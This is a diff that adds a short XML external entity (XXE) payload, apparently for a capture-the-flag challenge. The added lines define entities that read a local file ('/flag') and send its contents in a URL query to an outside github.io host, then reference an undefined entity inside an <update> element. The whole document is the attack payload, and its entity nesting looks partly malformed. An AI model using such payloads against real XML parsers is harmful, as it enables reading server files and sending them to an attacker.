@@ -1,0 +1,6 @@
+<!DOCTYPE foo [
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % send SYSTEM "https://your-username.github.io/xxe-payload/?flag=%file;">
+%send;
+]>
+<update><fname>&foo;</fname></update>
